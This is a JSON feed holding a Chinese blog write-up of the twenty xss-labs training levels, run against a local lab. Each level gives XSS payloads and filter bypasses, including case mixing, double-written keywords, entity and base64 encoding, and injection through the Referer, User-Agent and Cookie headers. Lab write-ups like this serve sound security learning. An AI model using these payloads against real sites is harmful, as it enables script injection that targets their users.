{
    "version": "https://jsonfeed.org/version/1",
    "title": "sqrt7 • All posts by \"xss-labs\" category",
    "description": "",
    "home_page_url": "https://w-sqrt7.github.io",
    "items": [
        {
            "id": "https://w-sqrt7.github.io/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/",
            "url": "https://w-sqrt7.github.io/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/",
            "title": "XSS-labs通关记录",
            "date_published": "2024-05-01T05:32:35.376Z",
            "content_html": "<h1 id=\"xss-labs通关记录\"><a href=\"#xss-labs通关记录\" class=\"headerlink\" title=\"xss-labs通关记录\"></a>xss-labs通关记录</h1><h2 id=\"第一关\"><a href=\"#第一关\" class=\"headerlink\" title=\"第一关\"></a>第一关</h2><p>这一关没有做出任何的过滤，直接传入payload即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:90/xss-labs/level1.php?name=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430201556793.png\" alt=\"image-20240430201556793\"></p>\n<h2 id=\"第二关\"><a href=\"#第二关\" class=\"headerlink\" title=\"第二关\"></a>第二关</h2><p>先尝试直接传入payload，观察结果发现并没有成功，查看页面源代码，可以看到特殊符号被转义了，可通过传入value中内容，利用  “&gt;  进行语句闭合，执行payload</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20201732-1714479821209.png\" alt=\"屏幕截图 2024-04-30 201732\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt; &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; &lt;&quot;</span><br><span class=\"line\">&quot;&gt; &lt;img src=&#x27;777&#x27; onerror=alert()&gt; &lt;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430202725281.png\" alt=\"image-20240430202725281\"></p>\n<h2 id=\"第三关\"><a href=\"#第三关\" class=\"headerlink\" title=\"第三关\"></a>第三关</h2><p>还是先尝试上一关的手法并观察结果，发现传入的特殊符号同样是被转义，这一次连双引号也一起转义了</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20203304.png\" alt=\"屏幕截图 2024-04-30 203304\"></p>\n<p>查看一下源码，可以发现这一关的关键在于htmlspecialchars函数</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430203735322.png\" alt=\"image-20240430203735322\"></p>\n<p>使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素，但是默认是只编码双引号的，而且单引号无论如何都不转义。</p>\n<p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p>\n<p>预定义的字符是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- &amp; （和号）成为 &amp;amp;</span><br><span class=\"line\">- &quot; （双引号）成为 &amp;quot;</span><br><span class=\"line\">- &#x27; （单引号）成为 &#x27;</span><br><span class=\"line\">- &lt; （小于）成为 &amp;lt;</span><br><span class=\"line\">- &gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>然后尝试绕过特殊符号就可以通关，这里需要用到onclick或者onfocus事件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; onclick=&#x27;alert(7)</span><br><span class=\"line\">&#x27; onfocus=javascript:alert(7) &#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430204417225.png\" alt=\"image-20240430204417225\"></p>\n<h2 id=\"第四关\"><a href=\"#第四关\" class=\"headerlink\" title=\"第四关\"></a>第四关</h2><p>和上一关并没有太大的出入，只是单引号变为了双引号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; onclick=&quot;alert(7)</span><br><span class=\"line\">&quot; onfocus=javascript:alert(7) &quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430204617420.png\" alt=\"image-20240430204617420\"></p>\n<h2 id=\"第五关\"><a href=\"#第五关\" class=\"headerlink\" title=\"第五关\"></a>第五关</h2><p>先尝试上一关payload，并观察页面源代码，可以看到on被过滤了，实际上还过滤了&lt;script ,并且对大小写进行了限制</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20205222.png\" alt=\"屏幕截图 2024-04-30 205222\"></p>\n<p>利用&lt;a&gt;标签进行绕过&lt;a href&#x3D;”<a href=\"https://www.baidu.com\">百度\\\">https://www.baidu.com&quot;&gt;百度\\</a></p>\n<p>href属性的意思是 当标签&lt;a&gt;被点击的时候，就会触发执行转跳，可以是转跳到一个网站，我们还可以触发执行一段js代码</p>\n<p>注意闭合问题，payload传入后点击’xxx’执行即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt; &lt;a href=javascript:alert(7)&gt;xxx&lt;/a&gt; &lt;&quot;</span><br><span class=\"line\">&quot;&gt; &lt;iframe src=&quot;javascript:alert(7)&quot;&gt;&lt;/iframe&gt; &lt;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430210412092.png\" alt=\"image-20240430210412092\"></p>\n<h2 id=\"第六关\"><a href=\"#第六关\" class=\"headerlink\" title=\"第六关\"></a>第六关</h2><p>这一关过滤了很多，但是并没有对大小写做出限制，可以尝试大小写绕过</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430210649780.png\" alt=\"image-20240430210649780\"></p>\n<p>尝试大小写绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt; &lt;sCript&gt;alert(7)&lt;/sCript&gt; &lt;&quot;</span><br><span class=\"line\">&quot; Onfocus=javascript:alert(7) &quot;</span><br><span class=\"line\">&quot;&gt; &lt;a hRef=javascript:alert(7)&gt;x&lt;/a&gt; &lt;&quot;</span><br><span class=\"line\">&quot;&gt; &lt;a HrEf=&quot;javascript:alert(7)&quot;&gt;</span><br><span class=\"line\">&quot;&gt; &lt;iframe sRc=&quot;javascript:alert(7)&quot;&gt; &lt;/iframe&gt;</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430210843884.png\" alt=\"image-20240430210843884\"></p>\n<h2 id=\"第七关\"><a href=\"#第七关\" class=\"headerlink\" title=\"第七关\"></a>第七关</h2><p>同样尝试上一关的payload并观察，可以理解他将传入的敏感的关键字给处理掉了</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20211042.png\" alt=\"屏幕截图 2024-04-30 211042\"></p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430211719760.png\" alt=\"image-20240430211719760\"></p>\n<p>查看源码，观察过滤的内容，发现还可以利用img标签进行绕过，可以利用双写进行绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt; &lt;scscriptript&gt;alert(7)&lt;/sscriptcript&gt; &lt;&quot;</span><br><span class=\"line\">&quot;&gt; &lt;a hrehreff=javasscriptcript:alert(7)&gt;xxx&lt;/a&gt; &lt;&quot;</span><br><span class=\"line\">&quot;&gt; &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+&quot;&gt; &lt;&quot;</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430211626186.png\" alt=\"image-20240430211626186\"></p>\n<h2 id=\"第八关\"><a href=\"#第八关\" class=\"headerlink\" title=\"第八关\"></a>第八关</h2><p>先尝试输入些东西，进行查看，发现传入的内容写入了两个地方</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20101245.png\" alt=\"屏幕截图 2024-05-01 101245\"></p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501101725242.png\" alt=\"image-20240501101725242\"></p>\n<p>过滤的关键字很多，但是我们能利用href的自动Unicode解码，插入一段js伪协议，点击链接执行即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javascript:alert()</span><br><span class=\"line\">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501102011700.png\" alt=\"image-20240501102011700\"></p>\n<h2 id=\"第九关\"><a href=\"#第九关\" class=\"headerlink\" title=\"第九关\"></a>第九关</h2><p>在上一关的基础山又做出了要求，即传入的内容中必需有  http:&#x2F;&#x2F;  才可以</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501102344500.png\" alt=\"image-20240501102344500\"></p>\n<p>基础方法同时，在后面加上 &#x2F;<em>http:&#x2F;&#x2F;</em>&#x2F;将传入的内容注释掉就能绕过且不影响payload正常执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501102629896.png\" alt=\"image-20240501102629896\"></p>\n<h2 id=\"第十关\"><a href=\"#第十关\" class=\"headerlink\" title=\"第十关\"></a>第十关</h2><p>通过url传入参数，观察页面源代码，可以看到，因为h2标签，传入keyword并没有任何作用，且input标签被隐藏掉了</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20103204.png\" alt=\"屏幕截图 2024-05-01 103204\"></p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501103633467.png\" alt=\"image-20240501103633467\"></p>\n<p>找到对应的input标签，修改其type值为text，将输入框显示处理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?t_sort=&quot; onclick=&quot;alert(&#x27;xss&#x27;)&quot; type=&quot;text</span><br><span class=\"line\">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501104117538.png\" alt=\"image-20240501104117538\"></p>\n<h2 id=\"第十一关\"><a href=\"#第十一关\" class=\"headerlink\" title=\"第十一关\"></a>第十一关</h2><p>观察源码，可以看出关键点就在于referer头，以此来进行注入即可</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20104547.png\" alt=\"屏幕截图 2024-05-01 104547\"></p>\n<p>通过BP或者hackbar传入payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer: &quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20105305.png\" alt=\"屏幕截图 2024-05-01 105305\"></p>\n<h2 id=\"第十二关\"><a href=\"#第十二关\" class=\"headerlink\" title=\"第十二关\"></a>第十二关</h2><p>这次先查看前端页面源代码，不难猜出这一关是UA头注入，和上一关没有太大的区别</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20110130.png\" alt=\"屏幕截图 2024-05-01 110130\"></p>\n<p>同样利用BP或hackbar传入payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: &quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20110457.png\" alt=\"屏幕截图 2024-05-01 110457\"></p>\n<h2 id=\"第十三关\"><a href=\"#第十三关\" class=\"headerlink\" title=\"第十三关\"></a>第十三关</h2><p>同样的操作，观察代码，可以猜出来这一次是cookie注入</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20110648.png\" alt=\"屏幕截图 2024-05-01 110648\"></p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501111432088.png\" alt=\"image-20240501111432088\"></p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501112536081.png\" alt=\"image-20240501112536081\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: user=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501112620737.png\" alt=\"image-20240501112620737\"></p>\n<h2 id=\"第十四关\"><a href=\"#第十四关\" class=\"headerlink\" title=\"第十四关\"></a>第十四关</h2><p>这一关具体是个什么意思没动，但是他这个网站好像是寄掉了，不知道有没有影响</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501113154561.png\" alt=\"image-20240501113154561\"></p>\n<p>看了一下网上的内容，说是这一关比较特殊，payload是一张图片马，考察了CTF中的杂项中隐写Exif隐藏信息</p>\n<h2 id=\"第十五关\"><a href=\"#第十五关\" class=\"headerlink\" title=\"第十五关\"></a>第十五关</h2><p>发现关键点为ng-include</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20123236.png\" alt=\"屏幕截图 2024-05-01 123236\"></p>\n<p>ng-include指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。</p>\n<p>ng-include属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。</p>\n<p>这里尝试包含第一关的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(7)&gt;&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501123627808.png\" alt=\"image-20240501123627808\"></p>\n<h2 id=\"第十六关\"><a href=\"#第十六关\" class=\"headerlink\" title=\"第十六关\"></a>第十六关</h2><p>查看源码，发现过滤了空格</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501123925887.png\" alt=\"image-20240501123925887\"></p>\n<p>尝试利用%0A绕过空格</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?keyword=&lt;svg%0Aonload=alert(7)&gt;</span><br><span class=\"line\">?keyword=&lt;img%0dsrc=1%0donerror=alert(7)&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501124129938.png\" alt=\"image-20240501124129938\"></p>\n<h2 id=\"第十七关\"><a href=\"#第十七关\" class=\"headerlink\" title=\"第十七关\"></a>第十七关</h2><p>embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会没有显示的区域在，他们就能有块错误的区域 </p>\n<p>embed标签，是用来嵌入图片的。可以用onclick或onmouseover绕过。因为这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick或onmouseover看作另外一个属性。可绕过加载的swf文件</p>\n<p>注意火狐浏览器肯能不兼容，注意更换浏览器尝试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?arg01=a&amp;arg02=aaa onmousemove=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501125037463.png\" alt=\"image-20240501125037463\"></p>\n<h2 id=\"第十八关\"><a href=\"#第十八关\" class=\"headerlink\" title=\"第十八关\"></a>第十八关</h2><p>这一关和上一关基本上是一样的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?arg01=a&amp;arg02=aaa onmousemove=alert(1)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501130406838.png\" alt=\"image-20240501130406838\"></p>\n<h2 id=\"第十九关\"><a href=\"#第十九关\" class=\"headerlink\" title=\"第十九关\"></a>第十九关</h2><p>这里无法继续使用前两关的payload，因为他利用双引号将其闭合掉了，没法绕出去了</p>\n<p>这一关用到的是flash xss</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert()&quot;&gt;here&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"第二十关\"><a href=\"#第二十关\" class=\"headerlink\" title=\"第二十关\"></a>第二十关</h2><p>这一关需要反编译的知识点</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?arg01=id&amp;arg02=\\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)</span><br><span class=\"line\">?arg01=id&amp;arg02=xss\\&quot;))&#125;catch(e)&#123;alert(1)&#125;//%26width=123%26height=123</span><br></pre></td></tr></table></figure>\n\n\n\n<p>参考文章：</p>\n<p><a href=\"https://blog.csdn.net/l2872253606/article/details/125638898\">https://blog.csdn.net/l2872253606/article/details/125638898</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/338123.html\">https://www.freebuf.com/articles/web/338123.html</a></p>\n<p><a href=\"https://blog.csdn.net/u014029795/article/details/103213877\">https://blog.csdn.net/u014029795/article/details/103213877</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_30702413/article/details/99326627\">https://blog.csdn.net/weixin_30702413/article/details/99326627</a></p>\n<p><a href=\"https://blog.csdn.net/u014029795/article/details/103217680\">https://blog.csdn.net/u014029795/article/details/103217680</a></p>\n",
            "tags": [
                "原创",
                "靶场",
                "xss-labs"
            ]
        }
    ]
}